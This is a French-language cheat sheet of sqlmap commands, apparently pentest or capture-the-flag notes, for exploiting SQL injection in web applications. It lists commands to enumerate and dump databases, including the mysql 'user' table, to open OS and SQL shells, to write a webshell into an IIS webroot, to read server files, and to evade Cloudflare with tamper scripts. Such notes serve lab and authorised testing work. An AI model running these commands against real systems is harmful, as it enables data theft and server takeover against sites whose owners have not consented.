# sqlmap

## pratique:

1. Faire un “copy to file” de la requete depuis burp
2. sqlmap -r <fichier> -a --batch



## en GET
sqlmap -u "http://example.com/?a=1&b=2&c=3" -p "a,b"

## en POST
sqlmap -u "http://example.com/" --data "a=1&b=2&c=3" -p "a,b" --method POST
     

## lister les tables:
sqlmap -u http://10.10.10.143/room.php?cod=1 -p "cod" --dbms=mysql --tables

#lister les tables d'une base
python sqlmap.py -u "http://www.site.com/section.php?id=51" --tables -D safecosmetics

#lister les colonne d'une tables:
python sqlmap.py -u "http://www.site.com/section.php?id=51" --columns -D safecosmetics -T users

#dumper une seule table:
sqlmap -u http://10.10.10.143/room.php?cod=1 -p "cod" --dbms=mysql -D 'mysql' -T 'user' --dump

#tout dumper
sqlmap -u http://10.10.10.10.... --dbms=mysql --dump-all

## dumper la base courante 
sqlmap -u http://10.10.10.10.... --dbms=mysql --dump

#from and by Burp 
→ clid droit -> copy to file
→ sqlmap -r <file>
→ sqlmap --proxy=http://127.0.0.1:8080-

## sqlmap crawl  
sqlmap -u http://10.10.10.10 --crawl=1


## sqlmap shell  
sqlmap -u http://10.10.10.10 --dbms=mysql --os-shell


## upload webshell
sudo sqlmap -r sqli_search_productName --file-write=webshell.php --file-dest=c:/inetpub/wwwroot/webshell.php --batch

#lire un fichier:
sqlmap -u http://127.0.0.1:1080/blog/single.php?id=* --level 5 --risk 3 --batch --file-read=/opt/lampp/htdocs/index.php


## checker les privs:
sqlmap -u 192.168.1.124/sqli/Less-1/?id=1 --privileges


## proxy
--temper pour le bypass de proxy


## Commande SQL:
sqlmap -u http://127.0.0.1:1080/blog/single.php?id=* --level 5 --risk 3 --batch --dbms=mysql --sql-shell

sql-shell> SELECT * FROM blogs

## sous windows:
télécharger le projet et lancer: python ./sqlmap.py

## cloudflare bypaass

python .\sqlmap.py -r .\question.raw --batch tamper="between,randomcase,space2comment" --random-agent

